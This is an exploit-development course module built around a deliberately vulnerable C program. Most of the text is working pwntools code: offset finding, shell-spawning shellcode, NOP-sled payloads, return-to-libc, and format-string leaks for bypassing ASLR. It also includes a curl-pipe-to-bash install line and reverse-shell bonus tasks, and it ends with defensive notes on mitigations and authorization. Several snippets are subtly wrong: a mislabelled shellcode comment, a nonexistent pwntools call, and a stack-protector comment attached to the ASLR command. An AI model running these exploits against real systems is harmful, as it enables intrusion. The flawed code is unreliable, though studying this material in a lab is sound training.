# Module 5 — Exploit Development Fundamentals

Exploit development is the art of making software do what its developers never intended. This module covers the fundamentals — buffer overflows, shellcode, and return address calculation. You'll use Python to craft exploits, not to write them from scratch. Understanding how exploits work makes you better at both attacking and defending systems.

This is the most technical module in the course. Take your time with it. Buffer overflows aren't intuitive until they suddenly are.

## Buffer Overflow Concepts

A buffer overflow happens when a program writes more data to a buffer than it can hold. The excess data overwrites adjacent memory. If an attacker controls what gets written and where it goes, they can hijack program execution.

### Stack Layout

When a function is called, the following happens on the stack:

1. Arguments are pushed onto the stack
2. The return address (where to go after the function) is pushed
3. The old base pointer is saved
4. Local variables (buffers) are allocated

```
High addresses
┌─────────────────────┐
│   Function Args     │
├─────────────────────┤
│   Return Address    │  ← Overwrite this to hijack control
├─────────────────────┤
│   Saved Base Pointer│
├─────────────────────┤
│                     │
│   Local Variables   │  ← Buffer is here
│   (Buffer)          │
│                     │
└─────────────────────┘
Low addresses
```

If the buffer is 64 bytes and you write 80 bytes, the extra 16 bytes overflow into the saved base pointer and return address. Control the return address, control the program.

### The Vulnerable Program

Let's create a simple vulnerable program to practice with:

```c
// vuln.c - Compile with: gcc -fno-stack-protector -z execstack -o vuln vuln.c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

Compile it with protections disabled:

```bash
# Disable stack canary, enable executable stack
gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
```

- `-fno-stack-protector`: Disables stack canaries (stack保护)
- `-z execstack`: Makes the stack executable
- `-no-pie`: Disables position-independent executable (fixed addresses)

### Finding the Buffer Size

Before you can overflow the buffer, you need to know exactly how big it is. Use a pattern:

```python
from pwn import *

# Generate a unique pattern
pattern = cyclic(200)
print(f"Pattern: {pattern}")

# Run the program with the pattern
# ./vuln <pattern>

# When it crashes, check the EIP value
# In GDB: info registers eip
# Or in the crash output

# Find the offset
eip_value = p32(0x6161616c)  # From the crash
offset = cyclic_find(eip_value)
print(f"Buffer + saved EBP = {offset} bytes")
```

Or manually with Python:

```python
# Send increasing sizes to find the overflow point
for i in range(1, 200):
    try:
        # For local testing
        import subprocess
        result = subprocess.run(
            ["./vuln", "A" * i],
            capture_output=True,
            timeout=2
        )
        if result.returncode != 0:
            print(f"Crashed at {i} bytes (return code: {result.returncode})")
            break
    except subprocess.TimeoutExpired:
        print(f"Timeout at {i} bytes (might be infinite loop)")
        break
```

### Controlling EIP

Once you know the offset, you can control the return address:

```python
from pwn import *

# Buffer overflow to control EIP
offset = 76  # Found using the pattern technique
junk = b"A" * offset

# New return address (point to our shellcode)
new_eip = p32(0x08049196)  # Address we want to jump to

# Construct the payload
payload = junk + new_eip

# Write payload to a file for the vulnerable program
with open("payload.txt", "wb") as f:
    f.write(payload)

print(f"Payload length: {len(payload)} bytes")
print(f"Payload: {payload.hex()}")
```

## Shellcode Crafting

Shellcode is machine code that spawns a shell. It's the payload you inject when you overflow a buffer. Writing shellcode from scratch is assembly programming. Using pwntools, you can generate it:

```python
from pwn import *

# Generate shellcode for spawning /bin/sh
shellcode = asm(shellcraft.sh())
print(f"Shellcode: {shellcode.hex()}")
print(f"Length: {len(shellcode)} bytes")

# Generate a reverse shell
shellcode = asm(shellcraft.cat("/etc/passwd"))
print(f"File read shellcode: {shellcode.hex()}")

# Generate a reverse shell to your listener
shellcode = asm(shellcraft.dupsh(host="127.0.0.1", port=4444))
```

### Shellcode Constraints

Real exploits often have constraints on what shellcode you can use:

```python
from pwn import *

# Generate shellcode without null bytes (for string-based overflows)
shellcode = asm(shellcraft.sh(), avoid=None, null=False)

# Generate shellcode without bad characters
bad_chars = [b"\x00", b"\x0a", b"\x0d"]  # null, newline, carriage return
shellcode = asm(shellcraft.sh(), avoid=set(bad_chars))

# Check for bad characters
for i, byte in enumerate(shellcode):
    if byte in [0x00, 0x0a, 0x0d]:
        print(f"Bad character at offset {i}: 0x{byte:02x}")
```

### Writing Custom Shellcode

When generated shellcode doesn't fit your constraints, write it manually:

```python
from pwn import *

# Linux x86 execve("/bin/sh") shellcode
# This is 28 bytes
shellcode = (
    b"\x31\xc0"              # xor eax, eax
    b"\x50"                  # push eax
    b"\x68\x2f\x2f\x73\x68" # push "//sh"
    b"\x68\x2f\x62\x69\x6e" # push "/bin"
    b"\x89\xe3"              # mov ebx, esp
    b"\x50"                  # push eax
    b"\x53"                  # push ebx
    b"\x89\xe1"              # mov ecx, esp
    b"\xb0\x0b"              # mov al, 0xb (execve syscall)
    b"\xcd\x80"              # int 0x80 (syscall)
)

print(f"Custom shellcode: {shellcode.hex()}")
print(f"Length: {len(shellcode)} bytes")
```

## Return Address Calculation

You know the buffer size and you have shellcode. Now you need to put the shellcode somewhere in memory and point the return address at it.

### NOP Sled

A NOP sled is a sequence of NOP instructions that slides into your shellcode:

```python
from pwn import *

offset = 76
shellcode = asm(shellcraft.sh())
nop_sled = b"\x90" * (200 - offset - len(shellcode))  # Fill with NOPs
payload = b"A" * offset + nop_sled + shellcode

# But we need to know where the NOP sled starts in memory
# Use GDB or trial and error
```

### Finding the Buffer Address

You need to know where in memory your buffer (and NOP sled) live:

```python
# In GDB:
# gdb ./vuln
# break vulnerable_function
# run AAAA
# print &buffer
# This gives you the address of the buffer

# Then calculate where the NOP sled starts
buffer_addr = 0xffffd5f0  # Example address from GDB
nop_offset = 10  # NOP sled starts 10 bytes into the buffer
target_addr = buffer_addr + nop_offset

payload = b"A" * offset + p32(target_addr) + b"\x90" * 200 + shellcode
```

### Using pwntools for Exploitation

```python
from pwn import *

# Set up the exploit
context(os='linux', arch='i386')

# Find the offset
pattern = cyclic(200)
process.run(["./vuln", pattern])
# After crash, check EIP value
eip_value = cyclic_find(0x6161616c)  # Example value
print(f"Offset to EIP: {eip_value}")

# Build the exploit
shellcode = asm(shellcraft.sh())
buffer_addr = 0xffffd5f0  # From GDB

# NOP sled + shellcode
payload = b"A" * eip_value
payload += p32(buffer_addr)  # Overwrite return address
payload += b"\x90" * 100     # NOP sled
payload += shellcode

# Send the exploit
p = process(["./vuln"])
p.sendline(payload)
p.interactive()  # Drop into the shell
```

### ASLR and PIE Bypasses

Modern systems have Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE). These randomize memory addresses, making exploits harder.

```python
# Leak a libc address to calculate base address
# This requires a leak vulnerability (format string, info disclosure)

from pwn import *

# Example: Using a format string vulnerability to leak
def leak_address(payload):
    p = process(["./vuln"])
    p.sendline(payload)
    response = p.recvall(timeout=2)
    p.close()
    return response

# Leak the return address using format string
# %p leaks a pointer from the stack
leak_payload = b"%p." * 20
leak = leak_address(leak_payload)
print(f"Leaked stack: {leak}")

# Parse leaked addresses
addresses = [int(x, 16) for x in leak.decode().split(".") if x.strip()]

# Calculate libc base from leaked __libc_start_main return
libc_start_main_return = addresses[12]  # Offset depends on binary
libc_base = libc_start_main_return - 0x18f30  # Offset to libc base

# Calculate system() and "/bin/sh" addresses
system_addr = libc_base + 0x00045420
bin_sh_addr = libc_base + 0x0018cd57

print(f"libc base: {hex(libc_base)}")
print(f"system(): {hex(system_addr)}")
print(f"/bin/sh: {hex(bin_sh_addr)}")
```

## Real Scenario: Exploiting a Simple Binary

Let's put it all together. You have a vulnerable binary. Here's the complete exploitation process.

### Step 1: Analyze the Binary

```bash
# Check protections
checksec --file=vuln

# Expected output:
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments
```

### Step 2: Find the Vulnerability

```python
# Fuzz for crash
from pwn import *

for i in range(1, 200):
    try:
        p = process(["./vuln"])
        p.sendline(b"A" * i)
        p.close()
    except EOFError:
        print(f"Crashed at {i} bytes")
        break
```

### Step 3: Determine Offset

```python
from pwn import *

# Generate pattern
pattern = cyclic(200)
p = process(["./vuln"])
p.sendline(pattern)
p.wait()

# Check core dump or use GDB
# In GDB after crash: info registers eip
# EIP = 0x6161616c
offset = cyclic_find(0x6161616c)
print(f"Offset: {offset}")  # Likely 76
```

### Step 4: Find Buffer Address

```bash
# In GDB
gdb ./vuln
(gdb) break vulnerable_function
(gdb) run AAAA
(gdb) print &buffer
$1 = (char (*)[64]) 0xffffd5a0
```

### Step 5: Generate Shellcode

```python
from pwn import *

shellcode = asm(shellcraft.sh())
print(f"Shellcode ({len(shellcode)} bytes): {shellcode.hex()}")
```

### Step 6: Build and Deliver the Exploit

```python
from pwn import *

context(os='linux', arch='i386')

offset = 76
buffer_addr = 0xffffd5a0  # From GDB

# Shellcode
shellcode = asm(shellcraft.sh())

# NOP sled size
nop_sled_size = 200 - offset - len(shellcode)

# Build payload
payload = b"A" * offset                    # Fill buffer + saved EBP
payload += p32(buffer_addr + 10)           # Return address -> NOP sled
payload += b"\x90" * nop_sled_size         # NOP sled
payload += shellcode                       # Actual shellcode

print(f"Payload length: {len(payload)} bytes")
print(f"Payload: {payload.hex()}")

# Send exploit
p = process(["./vuln"])
p.sendline(payload)
p.interactive()
```

### Step 7: Alternative — Return to libc

When the stack isn't executable (NX enabled), you can't run shellcode on the stack. Instead, return to existing functions in libc:

```python
from pwn import *

context(os='linux', arch='i386')

offset = 76

# Addresses (from GDB/objdump)
system_addr = 0xf7e12340    # system() in libc
exit_addr = 0xf7e04560      # exit() in libc
bin_sh_addr = 0xf7f56789    # "/bin/sh" string in libc

# Build ROP chain
payload = b"A" * offset
payload += p32(system_addr)  # Return to system()
payload += p32(exit_addr)    # Return address for system()
payload += p32(bin_sh_addr)  # Argument: "/bin/sh"

p = process(["./vuln"])
p.sendline(payload)
p.interactive()
```

### Step 8: Handling ASLR

With ASLR enabled, addresses change every run. You need a leak:

```python
from pwn import *

context(os='linux', arch='i386')

# Step 1: Leak a stack address
def leak_stack():
    # Format string vulnerability to leak stack addresses
    p = process(["./vuln"])
    p.sendline(b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
    leak = p.recvline()
    p.close()
    return leak

# Step 2: Parse leaked addresses
leak = leak_stack()
addresses = [int(x, 16) for x in leak.decode().split(".") if x.strip()]

# Step 3: Calculate buffer position
# The buffer address appears somewhere in the leaked stack values
for addr in addresses:
    if 0xffff0000 < addr < 0xfffff000:  # Likely stack address
        buffer_addr = addr
        break

# Step 4: Build exploit using leaked address
offset = 76
shellcode = asm(shellcraft.sh())

payload = b"A" * offset
payload += p32(buffer_addr + offset + 4)  # Return to NOP sled
payload += b"\x90" * 50
payload += shellcode

p = process(["./vuln"])
p.sendline(payload)
p.interactive()
```

## Exploit Patterns

### Buffer Overflow Patterns

```python
from pwn import *

def build_overflow_exploit(offset, target_addr, shellcode):
    """Generic buffer overflow exploit builder"""
    payload = b"A" * offset
    payload += p32(target_addr)
    payload += shellcode
    return payload

def build_rop_chain(offset, *functions_and_args):
    """Build a ROP chain"""
    payload = b"A" * offset
    for func, arg in functions_and_args:
        payload += p32(func)
        if arg:
            payload += p32(arg)
    return payload

def build_nop_sled(offset, shellcode, buffer_addr, sled_offset=10):
    """Build exploit with NOP sled"""
    nop_size = 500 - offset - len(shellcode)
    payload = b"A" * offset
    payload += p32(buffer_addr + sled_offset)
    payload += b"\x90" * nop_size
    payload += shellcode
    return payload
```

### Format String Exploits

Format string vulnerabilities let you read and write arbitrary memory:

```python
from pwn import *

# Read memory using %x or %p
def leak_memory(address):
    payload = p32(address) + b"%7$s"
    return payload

# Write to memory using %n
def write_memory(address, value):
    # Write 'value' bytes to 'address'
    payload = p32(address)
    payload += f"%{value}c%7$n".encode()
    return payload

# Leak a stack canary (useful for bypassing stack protection)
def leak_canary():
    # Canary is usually at a known offset on the stack
    payload = b"%15$p"  # Leak the canary value
    return payload
```

## Setting Up Your Exploit Development Environment

You need specific tools and configurations for exploit development. Don't use your production system — use a dedicated virtual machine.

### Required Tools

```bash
# Install pwntools (the exploit development Swiss Army knife)
pip install pwntools

# Install GDB extensions
# GEF (GDB Enhanced Features)
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Or Pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Install checksec (check binary protections)
apt install checksec

# Install nasm (assembler for custom shellcode)
apt install nasm
```

### Virtual Machine Setup

```bash
# Create a vulnerable testing environment
# Use a VM with ASLR disabled and no network access

# Disable ASLR
echo 0 > /proc/sys/kernel/randomize_va_space

# Disable stack protector system-wide (testing only)
# echo 0 > /proc/sys/kernel/randomize_va_space

# Install 32-bit libraries (many CTF binaries are 32-bit)
dpkg --add-architecture i386
apt update
apt install libc6:i386 libncurses5:i386 libstdc++6:i386
```

### GDB Workflow

GDB is essential for understanding what happens during exploitation:

```bash
# Start GDB with the vulnerable binary
gdb ./vuln

# Common GDB commands
(gdb) break vulnerable_function    # Set breakpoint
(gdb) run AAAA                      # Start program with input
(gdb) info registers               # Show register values
(gdb) x/20x $esp                   # Examine stack (20 hex words)
(gdb) x/s $esp                     # Examine stack as string
(gdb) disassemble main             # Disassemble function
(gdb) continue                     # Continue execution
(gdb) quit                         # Exit GDB
```

In GDB with GEF or Pwndbg, you get visual stack layouts, register highlighting, and pattern offset finding. These extensions make exploit development dramatically easier.

## Defensive Awareness

Understanding exploits helps you defend against them. Here's what the mitigations do:

- **Stack Canaries**: Random values placed before the return address. If overwritten, the program crashes before executing malicious code. Compiler places them with `-fstack-protector`.
- **NX/DEP**: Marks the stack as non-executable. Prevents shellcode injection on the stack. The OS enforces this via page permissions.
- **ASLR**: Randomizes memory addresses. Makes it hard to predict where shellcode or functions are. The kernel randomizes base addresses on each execution.
- **PIE**: Randomizes the executable's base address. Adds another layer of randomization. Even the code segment moves.
- **RELRO**: Makes the GOT read-only. Prevents GOT overwrite attacks. Full RELRO binds all symbols at startup.
- **CET/Shadow Stack**: Hardware-level protection that maintains a separate return address stack. Intel CET and AMD Shadow Stack make ROP chains much harder.

```bash
# Check binary protections
checksec --file=./vuln

# Expected output for a vulnerable binary:
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

# Enable ASLR (Linux)
echo 2 > /proc/sys/kernel/randomize_va_space

# Disable ASLR (for testing only)
echo 0 > /proc/sys/kernel/randomize_va_space

# Check current ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial, 2 = full
```

### When Exploit Mitigations Are Present

Modern binaries have protections enabled. You need different techniques:

```python
# NX enabled: Use ret2libc or ROP instead of shellcode on stack
# ROP chain calls system("/bin/sh") from libc

# ASLR enabled: Need a leak to calculate base addresses
# Format string vulnerability or info disclosure

# Canary enabled: Need to leak or brute-force the canary
# Or find a path that doesn't overwrite the canary

# Full RELRO: GOT is read-only, can't overwrite function pointers
# Use ret2csu or other advanced techniques
```

The cat and mouse game between exploit developers and defense engineers drives both sides forward. Understanding both sides makes you better at each.

## Assessment

### Lab Task: Exploit a Vulnerable Binary

You are given a compiled vulnerable binary. Exploit it to get a shell. Time limit: 120 minutes.

**Requirements:**
1. Determine the buffer size needed to overflow
2. Find the offset to the return address
3. Identify the buffer's memory address
4. Craft shellcode that spawns a shell
5. Build the complete exploit payload
6. Successfully exploit the binary to get a shell
7. Document every step and address calculation

**Deliverables:**
- Exploit script (`exploit.py`)
- Screenshot of successful exploitation (shell spawned)
- Written walkthrough of each step

**Grading Criteria:**
- Correctly identifies buffer size/offset (25 points)
- Successfully controls EIP (25 points)
- Shellcode executes correctly (25 points)
- Exploit is automated in Python (15 points)
- Documentation is clear (10 points)

### Bonus Challenges

- Bypass NX using return-to-libc
- Bypass ASLR using a format string leak
- Build a ROP chain for a more complex binary
- Create a reverse shell instead of bind shell

## Exploit Development Environment Safety

Exploit development requires a controlled environment. Never develop exploits on a production system or a system connected to untrusted networks. A misconfigured exploit can crash systems, corrupt data, or unintentionally compromise other machines on the network.

Use a dedicated virtual machine for exploit development. Disable network access or use host-only networking. Take snapshots before each experiment so you can revert if something goes wrong. The VM should have minimal software installed — just the tools you need for development. This reduces the blast radius if an exploit goes wrong.

Never test exploits against systems you don't own or have explicit written permission to test. Exploiting a system without authorization is a criminal offense in most jurisdictions, regardless of your intentions. Even testing "harmless" exploits against unauthorized targets can result in criminal charges.

When developing exploits for defensive purposes (penetration testing, vulnerability research), always work within a defined scope. Document the systems you're authorized to test, the methods you're authorized to use, and the timeline for testing. This documentation protects you legally and ensures everyone understands the boundaries.

The knowledge you gain from exploit development is powerful. Use it responsibly. The same techniques that help you find and fix vulnerabilities can be used to attack systems. The ethical security professional uses this knowledge to protect, not to harm.

## Evidence

Exploit development teaches you how software actually works at the machine level. You learn about memory layout, calling conventions, and how high-level code translates to assembly. This knowledge is essential for vulnerability research, malware analysis, and secure coding.

The buffer overflow is the oldest exploit technique, but it still appears in the wild. Understanding it gives you intuition for memory corruption bugs in general — use-after-free, heap overflows, type confusion. They're all variations on the same theme: memory safety violations.

**Libraries covered:** pwn (pwntools), struct, subprocess

**Concepts covered:** Buffer overflows, stack layout, shellcode, return addresses, NOP sleds, ASLR, NX, stack canaries, ROP chains, format string vulnerabilities